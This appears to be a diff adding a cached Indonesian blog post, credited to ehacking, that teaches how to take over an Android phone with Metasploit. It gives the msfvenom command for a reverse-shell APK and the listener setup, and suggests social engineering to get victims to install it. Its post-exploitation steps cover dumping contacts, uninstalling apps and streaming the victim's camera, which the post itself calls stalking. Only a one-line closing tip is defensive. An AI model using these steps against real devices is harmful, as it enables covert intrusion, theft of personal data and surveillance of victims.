@@ -1,0 +1,108 @@
+I"<p>Kita akan menggunakan msfvenom untuk membuat payload dan<!--more--> menyimpannya sebagai file apk. Setelah menghasilkan payload, kita perlu menyiapkan listener ke framework Metasploit. Setelah target mengunduh dan menginstal apk jahat, penyerang dapat dengan mudah mendapatkan kembali sesi meterpreter di Metasploit. Penyerang perlu melakukan beberapa rekayasa sosial untuk menginstal apk di perangkat seluler korban.</p>
+
+<h2 id="tutorial-langkah-demi-langkah">Tutorial langkah demi langkah</h2>
+
+<h3 id="menghasilkan-payload-dengan-msfvenom">Menghasilkan Payload dengan msfvenom</h3>
+
+<p>Pertama, jalankan Kali Linux sehingga kita dapat menghasilkan file apk sebagai aplikasi berbahaya. Kita perlu memeriksa IP publik kita yang ternyata ‘192.168.0.112’. Kamu juga dapat meretas perangkat Android melalui Internet dengan menggunakan IP Publik/Eksternal kamu di LHOST dan dengan port forwarding.</p>
+
+<p><img src="/images/kali.png" alt="kali" /></p>
+
+<p>Setelah mendapatkan IP host publik Anda, gunakan alat msfvenom yang akan menghasilkan payload untuk menembus perangkat Android. Ketik perintah:</p>
+<pre>
+# msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.112 LPORT=4444 R &gt; ehacking.apk
+</pre>
+<h2 id="dimana">Dimana:</h2>
+<ul>
+  <li><b>-p</b> menunjukkan jenis payload.</li>
+  <li><b>android/meterpreter/reverse_tcp</b> menentukan shell meterpreter terbalik akan datang dari perangkat Android target.</li>
+  <li><b>LHOST</b> adalah <b>IP Publik</b> Kamu.</li>
+  <li><b>LPORT</b> diatur sebagai listening port.</li>
+  <li><b>R&gt; /var/www/html</b> akan memberikan output langsung di server Apache.</li>
+  <li><b>apk</b> adalah nama akhir dari hasil akhir.</li>
+</ul>
+
+<p>Ini akan memakan waktu untuk menghasilkan file apk hampir sepuluh ribu byte.</p>
+
+<p><img src="/images/kali2.png" alt="kali-linix" /></p>
+
+<p><br /></p>
+
+<h1 id="meluncurkan-serangan">Meluncurkan Serangan</h1>
+
+<p><img src="/images/kali3.png" alt="kali-linux" /></p>
+
+<p>Semua tampaknya sudah siap, sekarang jalankan <b>msfconsole</b>. Gunakan <b>exploit multi/handler</b>, atur <b>payload</b> sama seperti yang dihasilkan sebelumnya, atur nilai <b>LHOST</b> dan &lt;p&gt;LPORT&lt;/p&gt; sama seperti yang digunakan dalam payload dan terakhir ketik <b>exploit</b> untuk meluncurkan serangan.
+<img src="/images/kali4.png" alt="kali-linux" /></p>
+
+<p>Dalam skenario kehidupan nyata, beberapa teknik rekayasa sosial dapat digunakan untuk membiarkan target mengunduh file apk berbahaya. Untuk demonstrasi kita hanya tinggal mengakses mesin penyerang untuk mengunduh file di perangkat Android.
+<img src="/images/kali5.jpg" alt="kali-linux" /></p>
+
+<p>Setelah berhasil mengunduhnya, pilih aplikasi yang akan diinstal.</p>
+
+<p>Sejauh ini, opsi penginstallan sering terlihat ketika kita mencoba menginstal beberapa aplikasi pihak ketiga dan biasanya pengguna tidak akan ragu untuk mengizinkan instalasi dari sumber yang tidak dikenal.
+<img src="/images/kali6.jpg" alt="kali-linux" /></p>
+
+<p>Setelah pengguna menginstal aplikasi dan menjalankannya, sesi <b>meterepreter</b> akan segera dibuka di sisi penyerang.
+<img src="/images/kali7.png" alt="kali-linux" /></p>
+
+<p><br />
+    <!-- DaffaDev -->
+<ins class="adsbygoogle iklan-artikel" style="display:block" data-ad-client="ca-pub-1171588080744378" data-ad-slot="8699873320" data-ad-format="auto" data-full-width-responsive="true"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script></p>
+
+<h1 id="post-exploitation">Post Exploitation</h1>
+
+<p>Ketik <b>“background”</b> dan kemudian <b>“sessions”</b> untuk membuat daftar semua sesi dari mana Anda dapat melihat semua IP yang terhubung ke mesin.
+<img src="/images/kali8.png" alt="kali-linux" /></p>
+
+<p>Kamu dapat berinteraksi dengan sesi apa pun dengan mengetik <b>sessions -i [session ID]</b>
+Setelah memasuki sesi, ketik <b>“help”</b> untuk membuat daftar semua perintah yang dapat kita ajukan di sesi ini.</p>
+
+<p>Kamu dapat melihat beberapa perintah sistem file yang berguna saat Anda mencoba mencari beberapa informasi atau data sensitif. Dengan menggunakan ini, Kamu dapat dengan mudah mengunduh atau mengunggah file atau informasi apa pun
+<img src="/images/kali9.png" alt="kali-linux" /></p>
+
+<p>Kamu juga akan menemukan beberapa perintah jaringan termasuk portfwd dan route
+<img src="/images/kali10.png" alt="kali-linux" /></p>
+
+<p>Beberapa perintah sistem yang kuat untuk mendapatkan ID pengguna, mendapatkan shell atau mendapatkan informasi sistem yang lengkap.</p>
+
+<p>Ketik “app_list” dan itu akan menampilkan semua aplikasi yang diinstal pada perangkat.
+<img src="/images/kali11.png" alt="kali-linux" /></p>
+
+<p>Kita juga memiliki kekuatan untuk mencopot pemasangan aplikasi apa pun dari perangkat Android.
+<img src="/images/kali12.png" alt="kali-linux" /></p>
+
+<h1 id="mengekstrak-kontak-dari-perangkat-android">Mengekstrak Kontak dari Perangkat Android</h1>
+
+<p>Sekarang kita ekstrak beberapa kontak dari perangkat target dengan mengetik “dump” dan tab ganda
+<img src="/images/kali13.png" alt="kali-linux" /></p>
+
+<p>Ini akan menampilkan semua opsi untuk mengekstrak dari perangkat. Ketik “dump_contacts” dan enter
+<img src="/images/kali14.png" alt="kali-linux" /></p>
+
+<p>Ini akan mengekstrak semua kontak dari perangkat Android dan akan menyimpannya di direktori lokal kita. Untuk melihat file ini ketik “ls” dan “cat [file_name]”
+<img src="/images/kali15.png" alt="kali-linux" /></p>
+
+<p>Ini akan menunjukkan konten file kontak yang sebelumnya diunduh dari perangkat target. Informasi ini sangat sensitif dan dapat dimanfaatkan oleh peretas.</p>
+
+<h1 id="mengendalikan-kamera-android">Mengendalikan Kamera Android</h1>
+
+<p>Dengan mengetik perintah <b>“webcam_stream”</b> kamu bisa menyusup dan mengamati melalui kamera android si korban, dan menguntitnya.
+<img src="/images/kali16.webp" alt="kali-linux" /></p>
+
+<h1 id="waspada-android-terbaru-pun-masih-lancar-terkena-serangan">Waspada… Android Terbaru pun Masih Lancar Terkena Serangan.</h1>
+
+<p>Handphone xiaomi MI10 dengan OS Android 10 Masih Lancar terkena serangan, Untuk kamu yang masih sering klik website tidak jelas yang masuk ke sms atau via whatsapp sebaiknya berhati-hati dari sanalah aplikasi ini terinstall diam-diam di android kamu.
+<img src="/images/kali17.webp" alt="kali-linux" /></p>
+
+<p><img src="/images/kali18.webp" alt="kali-linux" /></p>
+
+<p>Ada masih banyak lagi perintah yang tersedia di <b>meterpreter</b>. Lebih lanjut coba jelajahi dan pelajari apa yang bisa kita lakukan dengan perangkat Android. Ini menyimpulkan bahwa kita telah berhasil menembus perangkat Android menggunakan Kali Linux dan Metasploit-Framework.</p>
+
+<p>Tip sehat untuk mengamankan perangkat Android kamu adalah dengan <b>tidak menginstal aplikasi apa pun dari sumber yang tidak dikenal</b>, bahkan jika Anda benar-benar ingin menginstalnya, cobalah untuk membaca dan memeriksa kode sumbernya untuk mengetahui apakah file ini berbahaya atau tidak.</p>
+
+<p><small>Artikel ini awalnya diterbitkan di <a href="https://www.ehacking.net/2020/04/how-to-hack-an-android-phone-using-metasploit-msfvenom-in-kali-linux.html">blog ehacking.</a></small></p>
+:ET
